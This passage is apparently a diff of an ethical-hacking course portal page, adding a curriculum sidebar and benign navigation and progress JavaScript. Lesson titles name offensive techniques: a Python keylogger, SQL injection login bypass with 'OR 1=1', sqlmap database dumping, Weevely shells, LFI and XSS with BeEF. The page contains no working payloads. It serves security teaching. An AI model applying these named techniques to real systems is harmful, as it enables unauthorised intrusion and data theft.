+        <div class="curr-item-text"><div class="curr-item-title">⌨️ Bonus: Python Keylogger</div><div class="curr-item-dur">How keyloggers work + build one</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr" onclick="toggleSection(this,6)" style="border-left:2px solid rgba(239,68,68,0.5);">
+      <div class="curr-section-info">
+        <div class="curr-section-num" style="color:rgba(239,68,68,0.7);">🌐 </div>
+        <div class="curr-section-title">Web Hacking & SQL Injection</div>
+        <div class="curr-section-meta">12 lessons · SQLi · XSS · ZAP · LFI</div>
+      </div>
+      <div class="curr-chevron" id="chev6">▾</div>
+    </div>
+    <div class="curr-lessons" id="sec6">
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">How Websites Work</div><div class="curr-item-dur">Browser → DNS → Server → Database</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">Web Browsers Explained</div><div class="curr-item-dur">HTML, CSS, JS, cookies, DevTools</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">Web Servers (Apache, Nginx)</div><div class="curr-item-dur">What runs behind every website</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">Databases & SQL</div><div class="curr-item-dur">MySQL, PostgreSQL, SQLite</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">HTTP Requests & Responses</div><div class="curr-item-dur">GET, POST, headers, status codes</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">SQL Injection — What & Why</div><div class="curr-item-dur">Most dangerous web vulnerability</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">SQLi Step-by-Step Attack</div><div class="curr-item-dur">Login bypass with OR 1=1</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">SQLi Types & Payloads</div><div class="curr-item-dur">Classic, Blind, UNION, Time-Based</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">sqlmap — Automated SQLi</div><div class="curr-item-dur">Kali tool — dump databases</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">File Upload, Code Exec & LFI</div><div class="curr-item-dur">Weevely, shells, path traversal</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">XSS — Cross Site Scripting</div><div class="curr-item-dur">Stored, Reflected, DOM — BeEF</div></div></div>
+      <div class="curr-item" onclick="showDay(6)"><div class="curr-check"></div><div class="curr-item-text"><div class="curr-item-title">ZAP Scanner & Mitigation</div><div class="curr-item-dur">Auto-scan + how to fix everything</div></div></div>
+    </div>
+  </div>
+
+  <div style="padding:16px 18px;font-size:10px;color:rgba(255,255,255,0.25);line-height:1.8;border-top:1px solid rgba(255,255,255,0.05);margin-top:4px;">
+    TechCamp Boot Camp · Ethical Hacking<br>
+    Instructor: Gyamerah Afriyie Philimon<br>
+    techcamp.live
+  </div>
+</div><!-- end sidebar -->
+
+</div><!-- end udemy-wrap -->
 
 <script>
-  function showDay(n) {
-    document.querySelectorAll('.lesson').forEach(l => l.classList.remove('active'));
-    document.querySelectorAll('.p-day').forEach(d => d.classList.remove('active'));
-    document.getElementById('day' + n).classList.add('active');
-    document.querySelectorAll('.p-day')[n - 1].classList.add('active');
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+// ── Init ─────────────────────────────────────────────
+(function(){
+  var n = sessionStorage.getItem('tc_student') || 'Student';
+  document.getElementById('tb-name').textContent = n;
+})();
+
+// ── Sign out ─────────────────────────────────────────
+function signOut() {
+  if(confirm('Sign out of TechCamp portal?')) {
+    ['tc_auth','tc_student','tc_att','tc_lock'].forEach(function(k){ sessionStorage.removeItem(k); });
+    window.location.replace('index.html');
   }
+}
+
+// ── Progress ring ─────────────────────────────────────
+var CIRCUMFERENCE = 2 * Math.PI * 16; // r=16 → ~100.53
+
+function setProgress(day) {
+  var pct = Math.round((day / 6) * 100);
+  var offset = CIRCUMFERENCE - (pct / 100) * CIRCUMFERENCE;
+  var ring = document.getElementById('ring-fill');
+  if(ring) { ring.style.strokeDashoffset = offset; }
+  var pctEl = document.getElementById('ring-pct');
+  if(pctEl) pctEl.textContent = pct + '%';
+  var dayEl = document.getElementById('ring-day');
+  if(dayEl) dayEl.textContent = 'Day ' + day + ' / 6';
+  // Sidebar bar
+  var spFill = document.getElementById('sp-fill');
+  if(spFill) spFill.style.width = pct + '%';
+  var spPct = document.getElementById('sp-pct-text');
+  if(spPct) spPct.textContent = pct + '%';
+}
+
+// ── Show Day ─────────────────────────────────────────
+var currentDay = 1;
+
+function showDay(n) {
+  document.querySelectorAll('.lesson').forEach(function(l){ l.classList.remove('active'); });
+  var el = document.getElementById('day' + n);
+  if(el) el.classList.add('active');
+  currentDay = n;
+
+  // Update sidebar active states
+  document.querySelectorAll('.curr-item').forEach(function(item){
+    item.classList.remove('active');
+    var chk = item.querySelector('.curr-check');
+    if(chk) { chk.classList.remove('active'); chk.textContent = ''; }
+    var title = item.querySelector('.curr-item-title');
+    if(title) title.style.fontWeight = '';
+  });
+
+  var firstItem = document.querySelector('#sec' + n + ' .curr-item');
+  if(firstItem) {
+    firstItem.classList.add('active');
+    var chk = firstItem.querySelector('.curr-check');
+    if(chk) { chk.classList.add('active'); chk.textContent = '▶'; }
+  }
+
+  // Open right sidebar section, close others
+  for(var i=1;i<=6;i++){
+    var sec = document.getElementById('sec'+i);
+    var chev = document.getElementById('chev'+i);
+    var hdr = sec ? sec.previousElementSibling : null;
+    if(i === n) {
+      if(sec) sec.classList.add('open');
+      if(chev) chev.classList.add('open');
+      if(hdr) hdr.classList.add('active');
+    } else {
+      if(sec) sec.classList.remove('open');
+      if(chev) chev.classList.remove('open');
+      if(hdr) hdr.classList.remove('active');
+    }
+  }
+
+  setProgress(n);
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+// ── Sidebar section toggle ────────────────────────────
+function toggleSection(hdr, n) {
+  var sec = document.getElementById('sec' + n);
+  var chev = document.getElementById('chev' + n);
+  sec.classList.toggle('open');
+  chev.classList.toggle('open');
+}
+
+// ── Mobile sidebar ────────────────────────────────────
+function toggleSidebar() {
+  document.getElementById('sidebar').classList.toggle('open');
+}
+
+// ── Init ─────────────────────────────────────────────
+setProgress(1);
 </script>
 </body>
 </html>
